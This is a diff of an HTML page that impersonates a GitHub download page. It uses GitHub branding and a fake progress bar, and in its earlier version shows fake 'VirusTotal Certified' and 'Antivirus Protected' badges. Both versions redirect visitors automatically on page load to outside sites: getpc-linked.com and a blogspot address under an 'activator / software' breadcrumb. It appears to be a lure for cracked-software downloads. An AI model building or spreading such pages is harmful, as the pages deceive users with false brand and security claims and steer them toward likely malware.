@@ -1,488 +1,374 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="utf-8">
-    <title>Preparing your download... · GitHub</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Downloading - GitHub</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>📦</text></svg>">
     <style>
-      :root {
-        color-scheme: light dark;
-      }
-
-      * {
-        box-sizing: border-box;
-      }
-
-      body {
-        margin: 0;
-        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
-        background-color: #0d1117;
-        color: #c9d1d9;
-      }
-
-      a {
-        color: #58a6ff;
-        text-decoration: none;
-      }
-
-      a:hover {
-        text-decoration: underline;
-      }
-
-      .application-main {
-        min-height: 100vh;
-        display: flex;
-        flex-direction: column;
-      }
-
-      header {
-        background-color: #010409;
-        border-bottom: 1px solid #21262d;
-      }
-
-      .Header {
-        max-width: 1012px;
-        margin: 0 auto;
-        padding: 8px 16px;
-        display: flex;
-        align-items: center;
-        justify-content: space-between;
-      }
-
-      .Header-item {
-        display: flex;
-        align-items: center;
-      }
-
-      .Header-logo {
-        display: inline-flex;
-        align-items: center;
-        color: #f0f6fc;
-      }
-
-      .Header-logo svg {
-        fill: currentColor;
-      }
-
-      .Header-link {
-        color: #f0f6fc;
-        text-decoration: none;
-        font-weight: 600;
-        margin-right: 16px;
-        font-size: 14px;
-      }
-
-      .Header-link:last-child {
-        margin-right: 0;
-      }
-
-      .Header-link:hover {
-        text-decoration: underline;
-      }
-
-      main {
-        flex: 1 0 auto;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        padding: 24px 16px 40px;
-      }
-
-      .container-xl {
-        width: 100%;
-        max-width: 640px;
-        margin: 0 auto;
-      }
-
-      .Box {
-        background-color: #0d1117;
-        border: 1px solid #30363d;
-        border-radius: 6px;
-        box-shadow: 0 0 0 1px rgba(27,31,36,0.15);
-      }
-
-      .Box-header {
-        padding: 16px;
-        border-bottom: 1px solid #21262d;
-        text-align: center;
-      }
-
-      .Box-title {
-        font-size: 16px;
-        font-weight: 600;
-      }
-
-      .Box-subtitle {
-        font-size: 12px;
-        color: #8b949e;
-        margin-top: 4px;
-      }
-
-      .Box-body {
-        padding: 24px;
-      }
-
-      h1,
-      h2,
-      h3 {
-        margin: 0;
-        font-weight: 600;
-      }
-
-      .h2 {
-        font-size: 20px;
-        text-align: center;
-      }
-
-      .text-small {
-        font-size: 12px;
-      }
-
-      .text-muted {
-        color: #8b949e;
-      }
-
-      .text-center {
-        text-align: center;
-      }
-
-      .mt-1 { margin-top: 4px; }
-      .mt-2 { margin-top: 8px; }
-      .mt-3 { margin-top: 16px; }
-      .mt-4 { margin-top: 24px; }
-
-      .d-flex {
-        display: flex;
-      }
-
-      .flex-items-center {
-        align-items: center;
-      }
-
-      .flex-justify-center {
-        justify-content: center;
-      }
-
-      .flex-wrap {
-        flex-wrap: wrap;
-      }
-
-      .gap-2 {
-        gap: 8px;
-      }
-
-      .btn {
-        display: inline-block;
-        padding: 5px 16px;
-        font-size: 14px;
-        font-weight: 500;
-        line-height: 20px;
-        white-space: nowrap;
-        vertical-align: middle;
-        cursor: pointer;
-        border-radius: 6px;
-        border: 1px solid rgba(240,246,252,0.1);
-        background-color: #21262d;
-        color: #f0f6fc;
-        text-decoration: none;
-      }
-
-      .btn:hover {
-        background-color: #30363d;
-      }
-
-      .btn-primary {
-        background-color: #238636;
-        border-color: rgba(240,246,252,0.1);
-        color: #ffffff;
-        padding: 10px 32px;
-        font-size: 16px;
-      }
-
-      .btn-primary:hover {
-        background-color: #2ea043;
-      }
-
-      .Progress {
-        position: relative;
-        display: block;
-        width: 100%;
-        overflow: hidden;
-        background-color: #161b22;
-        border-radius: 6px;
-        height: 8px;
-      }
-
-      .Progress-item {
-        background-color: #2ea043;
-        width: 0%;
-        height: 100%;
-        transition: width 0.2s linear;
-      }
-
-      .note {
-        padding: 12px;
-        border-radius: 6px;
-        background-color: #161b22;
-        border: 1px solid #30363d;
-        font-size: 13px;
-        color: #c9d1d9;
-        text-align: center;
-      }
-
-      .redirect-message {
-        margin-top: 16px;
-        font-size: 14px;
-        color: #c9d1d9;
-        text-align: center;
-      }
-
-      .redirect-message strong {
-        font-weight: 600;
-      }
-
-      .verification-box {
-        background: linear-gradient(135deg, #1a472a 0%, #0d2818 100%);
-        border: 1px solid #2ea043;
-        border-radius: 6px;
-        padding: 20px;
-        margin-top: 16px;
-      }
-
-      .verification-title {
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-size: 16px;
-        font-weight: 600;
-        color: #3fb950;
-        margin-bottom: 16px;
-      }
-
-      .verification-title svg {
-        margin-right: 8px;
-        flex-shrink: 0;
-      }
-
-      .security-badges {
-        display: flex;
-        flex-wrap: wrap;
-        gap: 16px;
-        align-items: center;
-        justify-content: center;
-      }
-
-      .security-badge {
-        display: flex;
-        align-items: center;
-        background-color: rgba(46, 160, 67, 0.15);
-        border: 1px solid rgba(46, 160, 67, 0.3);
-        border-radius: 6px;
-        padding: 10px 16px;
-        font-size: 13px;
-        color: #c9d1d9;
-      }
-
-      .security-badge svg {
-        margin-right: 8px;
-        flex-shrink: 0;
-      }
-
-      .progress-section {
-        text-align: center;
-        margin-top: 16px;
-      }
-
-      .eta-display {
-        font-size: 18px;
-        font-weight: 600;
-        color: #c9d1d9;
-        margin-top: 8px;
-      }
-
-      footer {
-        border-top: 1px solid #21262d;
-        background-color: #010409;
-        color: #8b949e;
-        padding: 24px 16px;
-      }
-
-      .footer-container {
-        max-width: 1012px;
-        margin: 0 auto;
-        display: flex;
-        align-items: center;
-        justify-content: space-between;
-        flex-wrap: wrap;
-        gap: 8px;
-      }
-
-      .footer-links a {
-        color: #8b949e;
-        text-decoration: none;
-        margin-right: 12px;
-        font-size: 12px;
-      }
-
-      .footer-links a:last-child {
-        margin-right: 0;
-      }
-
-      .footer-links a:hover {
-        text-decoration: underline;
-      }
+        :root {
+            --github-bg: #0d1117;
+            --github-header-bg: #161b22;
+            --github-border: #30363d;
+            --github-blue: #1f6feb;
+            --github-text: #f0f6fc;
+            --github-text-secondary: #8b949e;
+            --github-progress-bg: #1f6feb;
+            --github-progress-track: #21262d;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background-color: var(--github-bg);
+            color: var(--github-text);
+            line-height: 1.5;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .header {
+            background-color: var(--github-header-bg);
+            border-bottom: 1px solid var(--github-border);
+            padding: 16px 32px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .github-logo {
+            display: flex;
+            align-items: center;
+            margin-right: 16px;
+        }
+        
+        .github-logo svg {
+            fill: var(--github-text);
+            width: 32px;
+            height: 32px;
+        }
+        
+        .breadcrumb {
+            font-size: 14px;
+            color: var(--github-text-secondary);
+        }
+        
+        .breadcrumb a {
+            color: var(--github-blue);
+            text-decoration: none;
+        }
+        
+        .breadcrumb a:hover {
+            text-decoration: underline;
+        }
+        
+        .container {
+            max-width: 896px;
+            margin: 40px auto;
+            padding: 0 32px;
+            width: 100%;
+        }
+        
+        .download-card {
+            background-color: var(--github-header-bg);
+            border: 1px solid var(--github-border);
+            border-radius: 6px;
+            padding: 24px;
+        }
+        
+        .card-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+        
+        .card-icon {
+            width: 48px;
+            height: 48px;
+            background-color: var(--github-blue);
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 12px;
+        }
+        
+        .card-icon svg {
+            width: 24px;
+            height: 24px;
+            fill: white;
+        }
+        
+        .card-title {
+            font-size: 20px;
+            font-weight: 600;
+        }
+        
+        .card-subtitle {
+            color: var(--github-text-secondary);
+            font-size: 14px;
+        }
+        
+        .progress-section {
+            margin: 24px 0;
+        }
+        
+        .progress-label {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+        }
+        
+        .progress-label span {
+            font-size: 14px;
+        }
+        
+        .progress-container {
+            width: 100%;
+            height: 8px;
+            background-color: var(--github-progress-track);
+            border-radius: 6px;
+            overflow: hidden;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background-color: var(--github-progress-bg);
+            border-radius: 6px;
+            transition: width 0.3s ease;
+            animation: progress 4s ease-in-out forwards;
+        }
+        
+        @keyframes progress {
+            0% { width: 0%; }
+            20% { width: 25%; }
+            40% { width: 50%; }
+            60% { width: 75%; }
+            80% { width: 85%; }
+            100% { width: 95%; }
+        }
+        
+        .info-box {
+            background-color: rgba(56, 139, 253, 0.1);
+            border: 1px solid rgba(56, 139, 253, 0.4);
+            border-radius: 6px;
+            padding: 16px;
+            margin-top: 24px;
+            display: flex;
+            align-items: flex-start;
+        }
+        
+        .info-icon {
+            margin-right: 12px;
+            margin-top: 2px;
+        }
+        
+        .info-icon svg {
+            fill: var(--github-blue);
+            width: 16px;
+            height: 16px;
+        }
+        
+        .info-content {
+            font-size: 14px;
+        }
+        
+        .info-content strong {
+            color: var(--github-text);
+        }
+        
+        .divider {
+            height: 1px;
+            background-color: var(--github-border);
+            margin: 24px 0;
+        }
+        
+        .actions {
+            display: flex;
+            justify-content: flex-end;
+        }
+        
+        .btn {
+            background-color: #238636;
+            color: white;
+            border: 1px solid rgba(240, 246, 252, 0.1);
+            border-radius: 6px;
+            padding: 8px 16px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        
+        .btn:hover {
+            background-color: #2ea043;
+        }
+        
+        .btn-secondary {
+            background-color: var(--github-header-bg);
+            color: var(--github-text);
+            margin-right: 8px;
+        }
+        
+        .btn-secondary:hover {
+            background-color: #30363d;
+        }
+        
+        footer {
+            margin-top: auto;
+            padding: 40px 32px;
+            border-top: 1px solid var(--github-border);
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 16px;
+            font-size: 12px;
+            color: var(--github-text-secondary);
+        }
+        
+        .footer-links a {
+            color: var(--github-text-secondary);
+            text-decoration: none;
+        }
+        
+        .footer-links a:hover {
+            color: var(--github-blue);
+            text-decoration: underline;
+        }
+        
+        .footer-copyright {
+            text-align: center;
+            margin-top: 16px;
+            font-size: 12px;
+            color: var(--github-text-secondary);
+        }
+        
+        @media (max-width: 768px) {
+            .container {
+                padding: 0 16px;
+            }
+            
+            .header {
+                padding: 16px;
+            }
+            
+            .download-card {
+                padding: 16px;
+            }
+            
+            .footer-links {
+                flex-direction: column;
+                align-items: center;
+                gap: 8px;
+            }
+        }
     </style>
-  </head>
-
-  <body>
-    <div class="application-main">
-      <header>
-        <div class="Header">
-          <div class="Header-item">
-            <a class="Header-logo" href="/">
-              <svg height="32" viewBox="0 0 16 16" width="32" aria-hidden="true">
-                <path fill-rule="evenodd"
-                  d="M8 0.198a8 8 0 0 0-2.528 15.597c0.4 0.074 0.547-0.174 0.547-0.386 0-0.19-0.007-0.693-0.011-1.36-2.226 0.483-2.695-1.073-2.695-1.073-0.364-0.924-0.89-1.17-0.89-1.17-0.727-0.497 0.055-0.487 0.055-0.487 0.804 0.057 1.227 0.826 1.227 0.826 0.714 1.223 1.873 0.87 2.33 0.665 0.072-0.517 0.279-0.87 0.508-1.07-1.777-0.202-3.644-0.888-3.644-3.954 0-0.873 0.312-1.587 0.824-2.147-0.083-0.202-0.357-1.017 0.078-2.12 0 0 0.671-0.215 2.2 0.82a7.673 7.673 0 0 1 2.004-0.27c0.68 0.003 1.366 0.092 2.004 0.27 1.528-1.035 2.198-0.82 2.198-0.82 0.437 1.103 0.163 1.918 0.08 2.12 0.513 0.56 0.823 1.274 0.823 2.147 0 3.074-1.87 3.75-3.652 3.948 0.287 0.247 0.543 0.735 0.543 1.482 0 1.07-0.01 1.933-0.01 2.196 0 0.214 0.145 0.463 0.55 0.384A8.001 8.001 0 0 0 8 0.198z">
-                </path>
-              </svg>
-            </a>
-          </div>
-          <div class="Header-item">
-            <a class="Header-link" href="/features">Features</a>
-            <a class="Header-link" href="/security">Security</a>
-            <a class="Header-link" href="/enterprise">Enterprise</a>
-            <a class="Header-link" href="/explore">Explore</a>
-          </div>
+</head>
+<body>
+    <div class="header">
+        <div class="github-logo">
+            <svg viewBox="0 0 16 16">
+                <path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8C0 11.54 2.29 14.53 5.47 15.59C5.87 15.66 6.02 15.42 6.02 15.21C6.02 15.02 6.01 14.39 6.01 13.72C4 14.09 3.48 13.23 3.32 12.78C3.23 12.55 2.84 11.84 2.5 11.65C2.22 11.5 1.82 11.13 2.49 11.12C3.12 11.11 3.57 11.7 3.72 11.94C4.44 13.15 5.59 12.81 6.05 12.6C6.12 12.08 6.33 11.73 6.56 11.53C4.78 11.33 2.92 10.64 2.92 7.58C2.92 6.71 3.23 5.99 3.74 5.43C3.66 5.23 3.38 4.41 3.82 3.31C3.82 3.31 4.49 3.1 6.02 4.13C6.66 3.95 7.34 3.86 8.02 3.86C8.7 3.86 9.38 3.95 10.02 4.13C11.55 3.09 12.22 3.31 12.22 3.31C12.66 4.41 12.38 5.23 12.3 5.43C12.81 5.99 13.12 6.7 13.12 7.58C13.12 10.65 11.25 11.33 9.47 11.53C9.76 11.78 10.01 12.26 10.01 13.01C10.01 14.08 10 14.94 10 15.21C10 15.42 10.15 15.67 10.55 15.59C13.71 14.53 16 11.53 16 8C16 3.58 12.42 0 8 0Z"/>
+            </svg>
         </div>
-      </header>
-
-      <main>
-        <div class="container-xl">
-          <div class="Box">
-            <div class="Box-header">
-              <div class="Box-title">github.com/downloader</div>
-              <div class="Box-subtitle">Verified Publisher</div>
-            </div>
-
-            <div class="Box-body">
-              <h2 class="h2">Preparing your download...</h2>
-              <p class="text-muted mt-2 text-center">
-                Archives are generated on demand and may take a few seconds.
-              </p>
-
-              <div class="verification-box">
-                <div class="verification-title">
-                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z" fill="#3fb950"/>
-                    <circle cx="12" cy="12" r="10" stroke="#3fb950" stroke-width="2" fill="none"/>
-                  </svg>
-                  File Verified & Scanned
-                </div>
-
-                <div class="security-badges">
-                  <div class="security-badge">
-                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                      <path d="M12 2L2 7v10c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-10-5z" fill="#3fb950"/>
-                      <path d="M10 17l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z" fill="#0d1117"/>
-                    </svg>
-                    VirusTotal Certified
-                  </div>
-
-                  <div class="security-badge">
-                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                      <path d="M12 2L4 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-8-3z" fill="#3fb950" opacity="0.8"/>
-                      <circle cx="12" cy="12" r="3" fill="#0d1117"/>
-                      <path d="M12 8v8M8 12h8" stroke="#0d1117" stroke-width="1.5"/>
-                    </svg>
-                    Antivirus Protected
-                  </div>
-                </div>
-              </div>
-
-              <div class="progress-section">
-                <div class="text-small text-muted">
-                  Estimated time remaining
-                </div>
-                <div class="eta-display" id="eta-label">3s</div>
-                <div class="mt-2 Progress" aria-hidden="true">
-                  <div class="Progress-item" id="progress-bar"></div>
-                </div>
-              </div>
-
-              <div class="redirect-message mt-4" id="redirect-message">
-                You will be automatically redirected in <span id="redirect-seconds">3</span> seconds.
-              </div>
-
-              <div class="mt-3 d-flex flex-justify-center">
-                <button id="redirect-now" class="btn btn-primary">
-                  Download now
-                </button>
-              </div>
-
-              <div class="note mt-4">
-                Having trouble? Try downloading again or use a different browser.<br>
-                Please keep this page open while we prepare your archive.
-              </div>
-            </div>
-          </div>
+        <div class="breadcrumb">
+            <a href="#">activator</a> / <a href="#">software</a> / <strong>Download</strong>
         </div>
-      </main>
-
-      <footer>
-        <div class="footer-container">
-          <span>© 2025 GitHub, Inc.</span>
-          <div class="footer-links">
-            <a href="/terms">Terms</a>
-            <a href="/privacy">Privacy</a>
-            <a href="/security">Security</a>
-            <a href="/status">Status</a>
-            <a href="/docs">Docs</a>
-          </div>
-        </div>
-      </footer>
     </div>
+    
+    <div class="container">
+        <div class="download-card">
+            <div class="card-header">
+                <div class="card-icon">
+                    <svg viewBox="0 0 16 16">
+                        <path fill-rule="evenodd" d="M7.47 10.78a.75.75 0 001.06 0l3.25-3.25a.75.75 0 00-1.06-1.06L8.75 8.44V1.75a.75.75 0 00-1.5 0v6.69L5.28 6.47a.75.75 0 00-1.06 1.06l3.25 3.25zM3.75 13a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5z"/>
+                    </svg>
+                </div>
+                <div>
+                    <div class="card-title">Downloading Your Software</div>
+                    <div class="card-subtitle">Preparing your download archive...</div>
+                </div>
+            </div>
+            
+            <div class="progress-section">
+                <div class="progress-label">
+                    <span>Processing files</span>
+                    <span id="progress-percent">0%</span>
+                </div>
+                <div class="progress-container">
+                    <div class="progress-bar" id="progress-bar"></div>
+                </div>
+            </div>
+            
+            <div class="info-box">
+                <div class="info-icon">
+                    <svg viewBox="0 0 16 16">
+                        <path fill-rule="evenodd" d="M8 1.5a6.5 6.5 0 100 13 6.5 6.5 0 000-13zM0 8a8 8 0 1116 0A8 8 0 010 8zm6.5-.25A.75.75 0 017.25 7h1a.75.75 0 01.75.75v2.75h.25a.75.75 0 010 1.5h-2a.75.75 0 010-1.5h.25v-2h-.25a.75.75 0 01-.75-.75zM8 6a1 1 0 100-2 1 1 0 000 2z"/>
+                    </svg>
+                </div>
+                <div class="info-content">
+                    <strong>Download will start automatically</strong>. If it doesn't, 
+                    <a href="#" style="color: var(--github-blue);">click here</a>. 
+                    Large files may take several minutes to download.
+                </div>
+            </div>
+            
+            <div class="divider"></div>
+            
+            <div class="actions">
+                <button class="btn btn-secondary">Cancel</button>
+                <button class="btn">Download directly</button>
+            </div>
+        </div>
+    </div>
+    
+    <footer>
+        <div class="footer-links">
+            <a href="https://docs.github.com/en/github/site-policy/github-terms-of-service" target="_blank">Terms</a>
+            <a href="https://docs.github.com/en/github/site-policy/github-privacy-statement" target="_blank">Privacy</a>
+            <a href="https://github.com/security" target="_blank">Security</a>
+            <a href="https://www.githubstatus.com/" target="_blank">Status</a>
+            <a href="https://docs.github.com/en" target="_blank">Help</a>
+            <a href="https://support.github.com/contact" target="_blank">Contact</a>
+            <a href="https://docs.github.com/en/github/site-policy/github-privacy-statement#our-use-of-cookies-and-tracking" target="_blank">Manage cookies</a>
+            <a href="https://docs.github.com/en/github/site-policy/github-privacy-statement#california-residents" target="_blank">Do not share my personal information</a>
+        </div>
+        <div class="footer-copyright">
+            © 2025 GitHub, Inc.
+        </div>
+    </footer>
 
     <script>
-      const REDIRECT_URL = "http://getpc-linked.com/";
-      const REDIRECT_DELAY_MS = 3000;
-      const totalSeconds = REDIRECT_DELAY_MS / 1000;
-      let remaining = totalSeconds;
-
-      const secondsSpan = document.getElementById("redirect-seconds");
-      const etaLabel = document.getElementById("eta-label");
-      const progressBar = document.getElementById("progress-bar");
-      const redirectNowBtn = document.getElementById("redirect-now");
-
-      function updateCountdown() {
-        if (remaining < 0) {
-          remaining = 0;
-        }
-        secondsSpan.textContent = remaining.toString();
-        etaLabel.textContent = remaining + "s";
-
-        const progress = ((totalSeconds - remaining) / totalSeconds) * 100;
-        progressBar.style.width = Math.max(5, progress) + "%";
-      }
-
-      updateCountdown();
-
-      const intervalId = setInterval(function () {
-        remaining -= 1;
-        updateCountdown();
-        if (remaining <= 0) {
-          clearInterval(intervalId);
-        }
-      }, 1000);
-
-      const timeoutId = setTimeout(function () {
-        window.location.href = REDIRECT_URL;
-      }, REDIRECT_DELAY_MS);
-
-      redirectNowBtn.addEventListener("click", function () {
-        clearTimeout(timeoutId);
-        window.location.href = REDIRECT_URL;
-      });
+        // Update progress percentage
+        const progressBar = document.getElementById('progress-bar');
+        const progressPercent = document.getElementById('progress-percent');
+        
+        let width = 0;
+        const interval = setInterval(() => {
+            if (width >= 95) {
+                clearInterval(interval);
+                progressPercent.textContent = '95%';
+            } else {
+                width += Math.random() * 10;
+                if (width > 95) width = 95;
+                progressBar.style.width = width + '%';
+                progressPercent.textContent = Math.round(width) + '%';
+            }
+        }, 300);
+        
+        // Redirect after a short delay to simulate download completion
+        setTimeout(function() {
+            window.location.href = "https://tata-suyasusu-kida.blogspot.com/";
+        }, 5000); // 5 second delay to match progress bar
     </script>
-  </body>
+</body>
 </html>
